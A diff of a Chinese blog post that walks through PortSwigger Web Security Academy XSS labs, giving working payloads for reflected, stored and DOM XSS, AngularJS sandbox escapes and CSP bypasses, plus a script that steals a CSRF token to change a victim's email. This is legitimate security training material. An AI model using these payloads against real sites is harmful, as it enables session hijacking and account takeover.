@@ -8,557 +8,687 @@ summary = "PortSwigger Web Security Academy XSS 实验通关记录：反射型�
 ShowToc = true
 TocOpen = false
 +++
-继续通关portswigger web security academy
 
-则篇文章来到了Cross-site scripting（xss）部分，由于很多题目对于Firefox不兼容，之后使用chrome浏览器
+> 环境：Burp Suite Community Edition · 靶场：PortSwigger Web Security Academy ｜ 进度：30 题完成 28 题（22、23 需 Burp Pro）
 
-1. #### Reflected XSS into HTML context with nothing encoded
+## 写在前面
 
-   ![image-20261111175813023](01.png)
+这是「PortSwigger 通关」系列的 XSS 篇。XSS 的本质是让用户输入被当成 HTML 或 JavaScript 执行，难点通常不在弹窗本身，而在于上下文判断、绕过过滤，以及和其他漏洞组合。
 
-   最基础的xss，利用网页上不经过过滤直接将用户输入写入网页的漏洞，通过输入恶意代码进行攻击。
+笔记按实验顺序整理：从最基础的反射型、存储型开始，再到 DOM 型、模板注入、CSP 绕过和 AngularJS 沙箱逃逸。
 
-   在搜索框输入<script>alert(1)</script>
+## 实验清单
 
-   ![image-20261111180001388](02.png)
+| # | 实验 | 状态 |
+|---|------|------|
+| 1 | Reflected XSS into HTML context with nothing encoded | ✅ |
+| 2 | Stored XSS into HTML context with nothing encoded | ✅ |
+| 3 | DOM XSS in `document.write` sink using source `location.search` | ✅ |
+| 4 | DOM XSS in `innerHTML` sink using source `location.search` | ✅ |
+| 5 | DOM XSS in jQuery anchor `href` attribute sink using `location.search` source | ✅ |
+| 6 | DOM XSS in jQuery selector sink using a hashchange event | ✅ |
+| 7 | Reflected XSS into attribute with angle brackets HTML-encoded | ✅ |
+| 8 | Stored XSS into anchor `href` attribute with double quotes HTML-encoded | ✅ |
+| 9 | Reflected XSS into a JavaScript string with angle brackets HTML encoded | ✅ |
+| 10 | DOM XSS in `document.write` sink using source `location.search` inside a select element | ✅ |
+| 11 | DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded | ✅ |
+| 12 | Reflected DOM XSS | ✅ |
+| 13 | Stored DOM XSS | ✅ |
+| 14 | Reflected XSS into HTML context with most tags and attributes blocked | ✅ |
+| 15 | Reflected XSS into HTML context with all tags blocked except custom ones | ✅ |
+| 16 | Reflected XSS with some SVG markup allowed | ✅ |
+| 17 | Reflected XSS in canonical link tag | ✅ |
+| 18 | Reflected XSS into a JavaScript string with single quote and backslash escaped | ✅ |
+| 19 | Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped | ✅ |
+| 20 | Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped | ✅ |
+| 21 | Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped | ✅ |
+| 22 | Exploiting cross-site scripting to steal cookies | ⏸ 需 Pro |
+| 23 | Exploiting cross-site scripting to capture passwords | ⏸ 需 Pro |
+| 24 | Exploiting XSS to bypass CSRF defenses | ✅ |
+| 25 | Reflected XSS with AngularJS sandbox escape without strings | ✅ |
+| 26 | Reflected XSS with AngularJS sandbox escape and CSP | ✅ |
+| 27 | Reflected XSS with event handlers and `href` attributes blocked | ✅ |
+| 28 | Reflected XSS in a JavaScript URL with some characters blocked | ✅ |
+| 29 | Reflected XSS protected by very strict CSP, with dangling markup attack | ✅ |
+| 30 | Reflected XSS protected by CSP, with CSP bypass | ✅ |
 
-   由于对输入未加以过滤，输入被直接拼接到了网页上，被html浏览器解析，从而执行alert(1)
+---
 
-   ![image-20261111180039170](03.png)
+## 1. Reflected XSS into HTML context with nothing encoded
 
-   ![image-20261111180103714](04.png)
+![image-20261111175813023](01.png)
 
-2. #### Stored XSS into HTML context with nothing encoded
+最基础的反射型 XSS：页面没有过滤搜索词，直接把它写进了 HTML。
 
-   ![image-20261111172738853](05.png)
+在搜索框中输入：
 
-   这一题来到了存储型xss漏洞，恶意用户通过上传恶意内容，使其被写入页面，导致任何访问网站的用户都会收到攻击
+```
+<script>alert(1)</script>
+```
 
-   ![](06.png)
+![image-20261111180001388](02.png)
 
-   在评论中写入
+服务端没有做任何过滤，输入被拼接到页面里，浏览器把它当作 HTML 解析，于是执行了 `alert(1)`。
 
-   <script>alert(1)</script>
+![image-20261111180039170](03.png)
 
-   在这之后任何访问者打开网页时都会触发alert(1)
+![image-20261111180103714](04.png)
 
-   ![image-20261111173434624](07.png)
+## 2. Stored XSS into HTML context with nothing encoded
 
-3. #### DOM XSS in `document.write` sink using source `location.search`
+![image-20261111172738853](05.png)
 
-   ![image-20261111173531581](08.png)
+这一题是存储型 XSS：评论内容会被写入页面，之后任何访问该页面的用户都会触发。
 
-   在这一题中在输入框直接输入<script>alert(1)</script>并没有效果![image-20261111174204991](09.png)
+![](06.png)
 
-   通过查看页面代码可以发现这一句中尖括号被编码了![image-20261111174701860](10.png)
+在评论中写入：
 
-   但是结合题干可以发现本题有可以利用的函数![image-20261111174728478](11.png)
+```
+<script>alert(1)</script>
+```
 
-   使查询为拼接在<img src="/resources/images/tracker.gif?searchTerms=后写入网页，且没有做过滤处理。
+提交后，所有访问者打开页面都会执行 `alert(1)`。
 
-   在输入框内填入 
+![image-20261111173434624](07.png)
 
-   ```
-   "> <img src=x onerror=alert(1) "
-   ```
+## 3. DOM XSS in `document.write` sink using source `location.search`
 
-    使拼接后变为
+![image-20261111173531581](08.png)
 
-   ```
-   <img src="/resources/images/tracker.gif?searchTerms="><img src="x" onerror="alert(1)" "">
-   ```
+直接在搜索框输入 `<script>alert(1)</script>` 没有效果。
 
-   从而实现攻击![image-20261111175704976](12.png)
+![image-20261111174204991](09.png)
 
-4. #### DOM XSS in `innerHTML` sink using source `location.search`
+查看页面源码可以发现，这里的尖括号被编码了。
 
-   ![image-20261111180243912](13.png)
+![image-20261111174701860](10.png)
 
-   ![image-20261111181041491](14.png)
+结合题干，可以找到题目使用的 `document.write` 函数。
 
-   观察这一题给出的函数可以发现，题目通过js代码将输入写入目标span中，如果直接写入<script>alert(1)</script>
+![image-20261111174728478](11.png)
 
-   会在js代码执行后才会写入，所以输入
+搜索词被拼接到 `<img src="/resources/images/tracker.gif?searchTerms=` 后面写入页面，而且没有做过滤。
 
-   ```
-   <img src=x onerror=alert(1)>
-   ```
+在输入框中填入：
 
-   ![image-20261111181325755](15.png)
+```
+"> <img src=x onerror=alert(1) "
+```
 
-   利用加载图片时获取图片失败报错执行alert(1)
+拼接后会变成：
 
-5. #### DOM XSS in jQuery anchor `href` attribute sink using `location.search` source
+```
+<img src="/resources/images/tracker.gif?searchTerms="><img src="x" onerror="alert(1)" "">
+```
 
-   ![image-20261111181445183](16.png)
+从而触发攻击。
 
-   观察这一题的函数![image-20261111184746158](17.png)
+![image-20261111175704976](12.png)
 
-   可以发现，会将返回的网址替换为通过get提交的returnPath的值，故将其改为
+## 4. DOM XSS in `innerHTML` sink using source `location.search`
 
-   ```
-   javascript:alert(document.cookie)
-   ```
+![image-20261111180243912](13.png)
 
-   ![image-20261111184917503](18.png)
+![image-20261111181041491](14.png)
 
-   在点击Back后页面alert弹出
+题目通过 JavaScript 把输入写进目标 `span`。`innerHTML` 不会执行 `<script>`，所以直接写入：
 
-6. #### DOM XSS in jQuery selector sink using a hashchange event
+```
+<script>alert(1)</script>
+```
 
-   ![image-20261111224618333](19.png)
+不会生效。改用图片的 `onerror`：
 
-   在主页面可以找到函数
+```
+<img src=x onerror=alert(1)>
+```
 
-   ![image-20261111224855002](20.png)
+![image-20261111181325755](15.png)
 
-   会在hash变化时，搜索匹配对应的文章并控制页面滚动过去。同时这题也不再是要求在本机上响应，而是通过在服务器上，构造包含该页面的恶意网站，并在受害者点击进入时响应。在该网站中使用iframe包含目标网站，利用onload在加载完成后改变hash以触发函数，同时构造恶意的hash值以调用print()函数。
+图片加载失败后触发 `onerror`，从而执行 `alert(1)`。
 
-   ![image-20261111230741696](21.png)
+## 5. DOM XSS in jQuery anchor `href` attribute sink using `location.search` source
 
-   使用
+![image-20261111181445183](16.png)
 
-   ```
-   <iframe src='https://0a8700d0035e477080953a30006300cb.web-security-academy.net/' onload="this.src+='#<img src=x onerror=print()>'">
-   ```
+观察题目给出的函数。
 
-   将其发送给受害者即可过关，也可以点击View exploit检查效果
+![image-20261111184746158](17.png)
 
-   ![image-20261111230906192](22.png)
+可以看到，返回链接会被替换成 GET 参数 `returnPath` 的值，因此把它改成：
 
-7. #### Reflected XSS into attribute with angle brackets HTML-encoded
+```
+javascript:alert(document.cookie)
+```
 
-   ![image-20261111231002622](23.png)
+![image-20261111184917503](18.png)
 
-   这一关转码了尖括号，需要通过写入属性完成。在搜索栏输入
+点击 Back 后就会弹出 alert。
 
-   ```
-   <script>alert(1)</script>
-   ```
+## 6. DOM XSS in jQuery selector sink using a hashchange event
 
-   后观察网页源代码可以发现![image-20261111231429367](24.png)
+![image-20261111224618333](19.png)
 
-   尖括号被转码为`&lt;`和`&gt;`同时在搜索栏的value中填入了搜索值。可以先使用双引号闭合value的取值，再在之后的语句中添加新的监听事件，以触发alert。使用
+在主页面可以找到相关函数。
 
-   ```
-   " onmouseover="alert(1)
-   ```
+![image-20261111224855002](20.png)
 
-   即可将其拼接为
+这段代码会在 hash 变化时搜索匹配的文章，并控制页面滚动过去。
 
-   ```
-   <input type="text" placeholder="Search the blog..." name="search" value="" onmouseover="alert(1)">
-   ```
+这一题要求把恶意页面放到服务器上，而不是只在本机验证。攻击页面用 iframe 嵌入目标网站，在 `onload` 加载完成后修改 hash 触发函数，并构造恶意的 hash 值调用 `print()`。
 
-   从而在鼠标在其上方时触发。需要注意的是这题使用onclick,autofocus onfocus均可显示弹窗但不算过关。
+![image-20261111230741696](21.png)
 
-8. #### Stored XSS into anchor `href` attribute with double quotes HTML-encoded
+使用：
 
-   ![image-20261111233938667](25.png)
+```
+<iframe src='https://0a8700d0035e477080953a30006300cb.web-security-academy.net/' onload="this.src+='#<img src=x onerror=print()>'">
+```
 
-   这一题要求在提交的评论中的用户名被点击时弹出alert。在随意页面提交评论后可以看到![image-20261111234147349](26.png)
+发送给受害者即可过关，也可以点击 View exploit 检查效果。
 
-   点击用户名时网站为提交的第四项Website，故使用JavaScript:alert(1)即可完成![image-20261111234349822](27.png)
+![image-20261111230906192](22.png)
 
-9. #### Reflected XSS into a JavaScript string with angle brackets HTML encoded
+## 7. Reflected XSS into attribute with angle brackets HTML-encoded
 
-   ![image-20261111234444688](28.png)
+![image-20261111231002622](23.png)
 
-   ![image-20261112000424754](29.png)
+这一关把尖括号转义了，需要从属性入手。在搜索栏输入：
 
-   尝试搜索后观察源代码可发现，搜索内容的尖括号被编码后拼接进了JavaScript语句中，故输入
+```
+<script>alert(1)</script>
+```
 
-   ```
-   '; alert(1); '
-   ```
+查看网页源码：
 
-   将该语句拼接为
+![image-20261111231429367](24.png)
 
-   ```
-   var searchTerms = ''; alert(1); '';
-   ```
+尖括号变成了 `&lt;` 和 `&gt;`，但搜索词被放进了 `value` 属性。可以先用双引号闭合 `value`，再添加一个事件：
 
-   即可触发alert
+```
+" onmouseover="alert(1)
+```
 
-10. #### DOM XSS in `document.write` sink using source `location.search` inside a select element
+拼接后变成：
 
-    ![image-20261112000910871](30.png)
+```
+<input type="text" placeholder="Search the blog..." name="search" value="" onmouseover="alert(1)">
+```
 
-    根据题干找到对应的函数![image-20261112012002526](31.png)
+鼠标移到输入框上就会触发。需要注意：用 `onclick` 或 `autofocus onfocus` 也能弹窗，但这题不算过关。
 
-    可以看到该函数会将get参数storeId写入到网页上，且没有经过过滤或转意，所以在url后加上
+## 8. Stored XSS into anchor `href` attribute with double quotes HTML-encoded
 
-    ```
-    &storeId=<script>alert(1)</script>
-    ```
+![image-20261111233938667](25.png)
 
-    之后访问网址即可通关
+这一题要求点击评论区的用户名时弹出 alert。先随便提交一条评论：
 
-11. #### DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
+![image-20261111234147349](26.png)
 
-    ![image-20261112012543328](32.png)
+用户名链接取的是评论里的 Website 字段，因此填入 `JavaScript:alert(1)` 即可。
 
-    这一题需要使用AngularJS的漏洞，查看源代码可以发现![image-20261112013117503](33.png)
+![image-20261111234349822](27.png)
 
-    AngularJS版本为1.7.7，已经移除了沙箱。在输入框中尝试输入{{1+1}}
+## 9. Reflected XSS into a JavaScript string with angle brackets HTML encoded
 
-    ![image-20261112013252102](34.png)
+![image-20261111234444688](28.png)
 
-    可以看到结果显示为2，说明被输入可以被编译，所以输入
+![image-20261112000424754](29.png)
 
-    ```
-    {{constructor.constructor('alert(1)')()}}
-    ```
+搜索后查看源码可以发现，搜索内容的尖括号被编码后，仍然被拼接进了 JavaScript 字符串，因此输入：
 
-    既可以成功执行alert()![image-20261112013645241](35.png)
+```
+'; alert(1); '
+```
 
-12. #### Reflected DOM XSS
+语句会变成：
 
-    ![image-20261112013813268](36.png)
+```
+var searchTerms = ''; alert(1); '';
+```
 
-    随意搜索后查看源代码可以看到，回显是通过/resources/js/searchResults.js里的函数search实现的
+从而触发 alert。
 
-    ![image-20261112013954748](37.png)
+## 10. DOM XSS in `document.write` sink using source `location.search` inside a select element
 
-    进入resources/js/searchResults.js观察可以发现![image-20261112015547397](38.png)
+![image-20261112000910871](30.png)
 
-    其使用json接收搜索结果，并且直接将搜索结果拼接进了eval函数。寻找bp代理的流量记录可以看到![image-20261112015725258](39.png)
+根据题干找到对应的函数：
 
-    搜索内容被加上了双引号，尝试使用双引号绕过时发现，其对双引号进行了处理
+![image-20261112012002526](31.png)
 
-    ![image-20261112021240433](40.png)
+该函数会把 GET 参数 `storeId` 写入页面，既没有过滤也没有转义。因此在 URL 后加上：
 
-    但经过测试后可以发现其并未对反斜杠进行处理
+```
+&storeId=<script>alert(1)</script>
+```
 
-    ![image-20261112021329353](41.png)
+访问该网址即可通关。
 
-    所以可以在双引号前加反斜杠使得，该字符串在被处理后变为`\\"`从而进行绕过。为了防止后面的双引号导致报错，在这里截断并注释之后的内容，输入
+## 11. DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
 
-    ```
-    \"+alert(1)}//
-    ```
+![image-20261112012543328](32.png)
 
-    即可过关![image-20261112023336238](42.png)
+这一题利用 AngularJS 的表达式注入。查看源码：
 
-13. #### Stored DOM XSS
+![image-20261112013117503](33.png)
 
-    ![image-20261112023431850](43.png)
+AngularJS 版本是 1.7.7，已经移除了沙箱。先输入 `{{1+1}}` 测试：
 
-    进入题目可以看到与之前不同，这道题中评论区是通过/resources/js/loadCommentsWithVulnerableEscapeHtml.js中的loadComments函数实现的![image-20261112024421115](44.png)
+![image-20261112013252102](34.png)
 
-    该函数使用escapeHTML函数对用户输入内容进行处理![image-20261112030146856](45.png)
+页面显示 `2`，说明输入会被 AngularJS 编译。于是输入：
 
-    <img src="46.png" alt="image-20261112030157979" style="zoom:67%;" />
+```
+{{constructor.constructor('alert(1)')()}}
+```
 
-    而观察escapeHTML函数可以发现，它只会对字符串中的第一个<和第一个>进行替换，故在payload前添加<>即可绕过
+即可执行 `alert()`。
 
-14. #### Reflected XSS into HTML context with most tags and attributes blocked
+![image-20261112013645241](35.png)
 
-    ![image-20261112030641936](47.png)
+## 12. Reflected DOM XSS
 
-    在这一题中大多数标签均被拦截了，可以看到输入`<script>`标签后弹出了标签不允许
+![image-20261112013813268](36.png)
 
-    ![image-20261112030851147](48.png)
+随便搜索后查看源码，可以看到回显是通过 `/resources/js/searchResults.js` 里的 `search` 函数实现的。
 
-    这里使用bp进行爆破。在https://portswigger.net/web-security/cross-site-scripting/cheat-sheet portswigger给出了所有的标签名。使用Intruder模块进行爆破![](49.png)
+![image-20261112013954748](37.png)
 
-    ![image-20261112032113597](50.png)
+进入 `resources/js/searchResults.js` 可以看到：
 
-    这里使用body，发现该网页同时会对属性进行拦截
+![image-20261112015547397](38.png)
 
-    ![image-20261112032210770](51.png)
+它用 JSON 接收搜索结果，并把结果直接拼进 `eval`。查看 Burp 代理的流量记录：
 
-    继续使用bp进行爆破
+![image-20261112015725258](39.png)
 
-    ![image-20261112032316555](52.png)
+搜索内容被加上了双引号。尝试用双引号绕过时，发现双引号会被处理：
 
-    ![image-20261112033034121](53.png)
+![image-20261112021240433](40.png)
 
-    这里使用容易触发的resize。在exploit-server中构造恶意网页
+但反斜杠没有被处理：
 
-    ```
-    <iframe src="https://0a0600320410fba7807003dc00b100f4.web-security-academy.net/?search=%3Cbody+onresize%3Dprint%28%29%3E" onload="this.style.width='100%'">
-    ```
+![image-20261112021329353](41.png)
 
-    并发送给受害者即可完成
+因此可以在双引号前加反斜杠，让字符串在处理后变成 `\\"`。为了防止后面的双引号导致报错，再截断并注释掉后面的内容，输入：
 
-15. #### Reflected XSS into HTML context with all tags blocked except custom ones
+```
+\"+alert(1)}//
+```
 
-    ![image-20261112035538167](54.png)
+即可过关。
 
-    在这一题中所有常规标签都被屏蔽了，只能使用自定义标签，同时测试可以发现，这题没有屏蔽属性，所以使用onfocus配合hash或者autofocus获得焦点即可。构造恶意网页
+![image-20261112023336238](42.png)
 
-    <script>
-    location='https://0ad800fe0496e4cf835ac96600250002.web-security-academy.net/?search=<abc onfocus=alert(document.cookie) autofocus tabindex=1>'
-    </script>
+## 13. Stored DOM XSS
 
-    将其发送给受害者即可
+![image-20261112023431850](43.png)
 
-    ![image-20261112041610854](55.png)
+这一题的评论区是通过 `/resources/js/loadCommentsWithVulnerableEscapeHtml.js` 里的 `loadComments` 函数实现的。
 
-16. #### Reflected XSS with some SVG markup allowed
+![image-20261112024421115](44.png)
 
-    ![image-20261112041733286](56.png)
+该函数调用 `escapeHTML` 处理用户输入：
 
-    这一题使用svg标签，由于svg标签需要配合其他标签使用，所以还是先对可以使用的标签和属性进行爆破
+![image-20261112030146856](45.png)
 
-    ![image-20261112044222352](57.png)
+![image-20261112030157979](46.png)
 
-    ![image-20261112054208947](58.png)
+观察 `escapeHTML` 可以发现，它只会替换字符串里的第一个 `<` 和第一个 `>`，因此在 payload 前面加 `<>` 就能绕过。
 
-    由于事件中只有onbegin能用，所以使用svg配合animatetransform触发onbegin。搜索
+## 14. Reflected XSS into HTML context with most tags and attributes blocked
 
-    ```
-    <svg><animatetransform  onbegin=alert(1)></svg>
-    ```
+![image-20261112030641936](47.png)
 
-    ![image-20261112054625167](59.png)
+这一题拦截了大多数标签。输入 `<script>` 后会提示标签不允许：
 
-    即可通关
+![image-20261112030851147](48.png)
 
-17. #### Reflected XSS in canonical link tag
+用 Burp Intruder 爆破标签名。PortSwigger 的 XSS cheat sheet 提供了完整的标签列表：
 
-    ![image-20261112055037342](60.png)
+```
+https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+```
 
-    注意到head中包含当前网址，且未作过滤![image-20261112055932519](61.png)
+![](49.png)
 
-    考虑到受害者的输出，使用accesskey将x绑定为快捷键，且点击效果为alert()即可触发
+![image-20261112032113597](50.png)
 
-    访问网址
+发现 `body` 可用，但这题同时还会过滤属性：
 
-    ```
-    https://0a97009803eae2c88712a273009600fe.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)
-    ```
+![image-20261112032210770](51.png)
 
-    后点击对应平台的快捷键即可
+继续用 Intruder 爆破属性：
 
-18. #### Reflected XSS into a JavaScript string with single quote and backslash escaped
+![image-20261112032316555](52.png)
 
-    ![image-20261112175813080](62.png)
+![image-20261112033034121](53.png)
 
-    在这一题中单引号和反斜杠都被处理了，观察搜索结果页面的函数![image-20261112180943921](63.png)
+最后选一个容易触发的事件 `resize`。在 exploit server 构造恶意页面：
 
-    可以注意到输入被直接拼接进了js语句，同时尖括号没有被转意，所以输入
+```html
+<iframe src="https://0a0600320410fba7807003dc00b100f4.web-security-academy.net/?search=%3Cbody+onresize%3Dprint%28%29%3E" onload="this.style.width='100%'">
+```
 
-    ```
-    </script><script>alert(1)</script>
-    ```
+发送给受害者即可完成。
 
-    可以关闭原本script标签，并开启一个新的执行命令
+## 15. Reflected XSS into HTML context with all tags blocked except custom ones
 
-    ![image-20261112181221001](64.png)
+![image-20261112035538167](54.png)
 
-19. Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
+这一题屏蔽了所有常规标签，只允许自定义标签；测试后发现属性没有被屏蔽。因此可以用 `onfocus` 配合 `autofocus` 让自定义标签获得焦点。
 
-    ![image-20261112185314276](65.png)
+构造恶意页面：
 
-    这一题中双引号和尖括号被编码，单引号被转义。查看源码可以发现，除了对输入的处理外均与上一题相同![image-20261112214022801](66.png)
+```html
+<script>
+location='https://0ad800fe0496e4cf835ac96600250002.web-security-academy.net/?search=<abc onfocus=alert(document.Cookie) autofocus tabindex=1>'
+</script>
+```
 
-    由于反斜杠没有被处理，与12题类似搜索框输入
+发送给受害者即可。
 
-    ```
-    \';alert(1);//
-    ```
+![image-20261112041610854](55.png)
 
-    即可
+## 16. Reflected XSS with some SVG markup allowed
 
-20. #### Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped![image-20261112215438947](67.png)
+![image-20261112041733286](56.png)
 
-    在这一题中输入的处理方式与上一题相似，但反斜杠也被转义了，在评论区任意输入内容后可以看到![image-20261112215539691](68.png)
+这一题允许部分 SVG 标签。SVG 通常要配合其他标签使用，所以先爆破可用的标签和属性：
 
-    网址被拼接进了onclick中，由于题目没有处理`&apos;`且早于 JS 解析所以可以使用`&apos;`进行绕过。进行评论并在网址后加上`&apos;+alert(1)+&apos;`将该标签拼接为![image-20261112222317464](69.png)
+![image-20261112044222352](57.png)
 
-    在点击作者名后，触发onclick事件进而触发alert
+![image-20261112054208947](58.png)
 
-21. #### Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
+事件中只有 `onbegin` 能用，因此用 SVG 配合 `animatetransform` 触发：
 
-    ![image-20261112231043166](70.png)
+```
+<svg><animatetransform onbegin=alert(1)></svg>
+```
 
-    在这题中尖括号，单双引号，反斜杠，反引号均被Unicode转义，而题干中提示了注入点为模板字符串![image-20261112231545399](71.png)
+![image-20261112054625167](59.png)
 
-    在源代码中可以看到搜索内容转义后拼接进了模板字符串，在搜索框中输入`${alert(1)}`搜索后发现触发alert![image-20261112231812599](72.png)
+即可通关。
 
-22. Exploiting cross-site scripting to steal cookies
+## 17. Reflected XSS in canonical link tag
 
-23. Exploiting cross-site scripting to capture passwords
+![image-20261112055037342](60.png)
 
-    这两题需要bp pro，跳过
+注意到 `<head>` 里的 canonical 链接包含当前网址，而且没有过滤：
 
-24. Exploiting XSS to bypass CSRF defenses
+![image-20261112055932519](61.png)
 
-    ![image-20261112232118801](73.png)
+利用 `accesskey` 把 `x` 绑定为快捷键，并把点击行为设为 `alert()`：
 
-    题目要求使用XSS绕过CSRF（**跨站请求伪造**）防御，在登录页面使用题目提供的账号登录后可以看到更换邮箱选项![image-20261112235152014](74.png)
+```
+https://0a97009803eae2c88712a273009600fe.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)
+```
 
-    使用bp抓包后可以看到，新邮箱使用post，提交内容有新邮箱和csrf的防护码
+访问后按对应平台的快捷键即可触发。
 
-    ![image-20261112235741337](75.png)
+## 18. Reflected XSS into a JavaScript string with single quote and backslash escaped
 
-    在评论区提交可以发现评论可以使用XSS注入js脚本且评论区的提交表单中包含csrf的防御码，故利用评论区上传
+![image-20261112175813080](62.png)
 
-    ```
-    <script>
-    var req = new XMLHttpRequest();
-    req.onload = function() {
-      var token = this.responseText.match(/name="csrf" value="([^"]+)"/)[1];
-      var form = document.createElement('form');
-      form.action = '/my-account/change-email';
-      form.method = 'POST';
-      var email = document.createElement('input');
-      email.name = 'email';
-      email.value = '1@2';
-      form.appendChild(email);
-      var csrf = document.createElement('input');
-      csrf.name = 'csrf';
-      csrf.value = token;
-      form.appendChild(csrf);
-      document.body.appendChild(form);
-      form.submit();
-    };
-    req.open('GET', '/my-account');
-    req.send();
-    </script>
-    ```
+这一题处理了单引号和反斜杠。观察搜索结果页面的函数：
 
-    之后访问该页面的用户将会自动将邮箱改为1@2
+![image-20261112180943921](63.png)
 
-25. Reflected XSS with AngularJS sandbox escape without strings
+输入被直接拼接进 JavaScript 语句，但尖括号没有转义，因此可以闭合原来的 `script` 标签，再开启一个新的：
 
-    ![image-20261113032316857](76.png)
+```
+</script><script>alert(1)</script>
+```
 
-    这题要求绕过AngularJS的沙箱，进入搜索结果页面可以看到AngularJS的版本为1.4.4，包含沙箱
+![image-20261112181221001](64.png)
 
-    ![image-20261113032440503](77.png)
+## 19. Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
 
-    同时可以看到使用的函数
+![image-20261112185314276](65.png)
 
-    ![image-20261113033143546](78.png)
+这一题编码了双引号和尖括号，并转义单引号。查看源码可以发现，除了输入处理外，其他部分与上一题相同：
 
-    因为输入单引号会被编码，所以使用toString，利用toString.constructor.prototype.charAt = [].join替换charAt函数以实现沙盒绕过。由于语句会在更改前进行解析，所以只有更内层的命令才会使用更换后的charAt，因为禁用了eval，所以使用order进行输出。为了执行需要将payload注入到`$parse(key)`中的key，所以在网址后方添加一个参数
+![image-20261112214022801](66.png)
 
-    ```
-    toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
-    ```
+由于反斜杠没有被处理，可以像第 12 题那样在搜索框输入：
 
-    ![image-20261113050513162](79.png)
+```
+\';alert(1);//
+```
 
-26. #### Reflected XSS with AngularJS sandbox escape and CSP
+即可绕过。
 
-    ![image-20261113052924494](80.png)
+## 20. Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
 
-    这一题需要同时绕过沙箱和csp，进入网页可以在bp的代理历史记录里看到网站csp的设置，其限制了js脚本只能同源，所以使用AngularJS绕过
+![image-20261112215438947](67.png)
 
-    ![image-20261113053045607](81.png)
+这一题的处理方式与上一题相似，但反斜杠也被转义了。先随便提交一条评论：
 
-    这一题与上一题的AngularJS版本相同，需要绕过沙箱
+![image-20261112215539691](68.png)
 
-    ![image-20261113061557201](82.png)
+评论里的网址被拼进了 `onclick`。服务端没有处理 `&apos;`，而 HTML 实体解码早于 JavaScript 解析，所以可以用 `&apos;` 绕过。
 
-    使用payload
+在评论的网址后加上 `&apos;+alert(1)+&apos;`：
 
-    ```
-    <input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x'
-    ```
+![image-20261112222317464](69.png)
 
-    将其转码后拼接在网址上，在攻击页面使用location跳转，得到
+点击作者名后会触发 `onclick`，进而执行 `alert`。
 
-    ```
-    <script>
-    location='https://0a380007045c6571816f200200060017.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x'
-    </script>
-    ```
+## 21. Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
 
-    发送给受害者即可
+![image-20261112231043166](70.png)
 
-27. #### Reflected XSS with event handlers and `href` attributes blocked
+这一题把尖括号、单双引号、反斜杠和反引号都做了 Unicode 转义；题干提示注入点是模板字符串。
 
-    ![image-20261113063035893](83.png)
+![image-20261112231545399](71.png)
 
-    这一题中禁用了事件和href属性，爆破后可以看到![image-20261113065103684](84.png)
+查看源码可以看到，搜索内容被转义后仍然拼进了模板字符串。直接在搜索框输入：
 
-    只有这几个标签可以使用，由于href标签被禁止，同时题目又要求使用，所以使用svg和animate动态的给a标签添加href属性。使用payload
+```
+${alert(1)}
+```
 
-    ```
-    <svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a></svg>
-    ```
+即可触发 alert。
 
-    ![image-20261113065914170](85.png)
+![image-20261112231812599](72.png)
 
-    在点击click me后即可触发alert
+## 22. Exploiting cross-site scripting to steal cookies
 
-28. Reflected XSS in a JavaScript URL with some characters blocked
+## 23. Exploiting cross-site scripting to capture passwords
 
-    ![image-20261113065957605](86.png)
+这两题需要 Burp Pro，跳过。
 
-    在源代码中可以看到get传递的值被拼接进了返回的超链接里![image-20261113073853544](87.png)
+## 24. Exploiting XSS to bypass CSRF defenses
 
-    尝试改变内容，发现在语句闭合，且postId可以被找到的情况下可以被解析,但空格会被转义为+，并去除括号
+![image-20261112232118801](73.png)
 
-    ![image-20261113074333819](88.png)
+题目要求用 XSS 绕过 CSRF（跨站请求伪造）防御。登录题目提供的账号后，可以看到更换邮箱的入口：
 
-    所以使用payload
+![image-20261112235152014](74.png)
 
-    ```
-    5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
-    ```
+用 Burp 抓包可以看到，修改邮箱使用 POST，提交内容包含新邮箱和 CSRF token：
 
-    先定义一个函数用来改变onerror事件为alert并抛出异常1337，将toString改为它，并利用window.''调用toString，将onerror改为alert后出现未捕获异常1337，触发alert，最后闭合语句。将payload拼接在网址后，点击Back to Blog即可弹出alert
+![image-20261112235741337](75.png)
 
-29. Reflected XSS protected by very strict CSP, with dangling markup attack
+评论区可以注入 JavaScript，而且评论表单本身也带 CSRF token，因此可以通过评论区上传下面的脚本：
 
-    ![image-20261113080152340](89.png)
+```html
+<script>
+var req = new XMLHttpRequest();
+req.onload = function() {
+  var token = this.responseText.match(/name="csrf" value="([^"]+)"/)[1];
+  var form = document.createElement('form');
+  form.action = '/my-account/change-email';
+  form.method = 'POST';
+  var email = document.createElement('input');
+  email.name = 'email';
+  email.value = '1@2';
+  form.appendChild(email);
+  var csrf = document.createElement('input');
+  csrf.name = 'csrf';
+  csrf.value = token;
+  form.appendChild(csrf);
+  document.body.appendChild(form);
+  form.submit();
+};
+req.open('GET', '/my-account');
+req.send();
+</script>
+```
 
-    登录提供的账号后，发现在更换邮箱界面，通过get传入email参数会出现在email栏中，且内容被直接填入了网址中![image-20261113080423473](90.png)
+之后访问该页面的用户会被自动把邮箱改成 `1@2`。
 
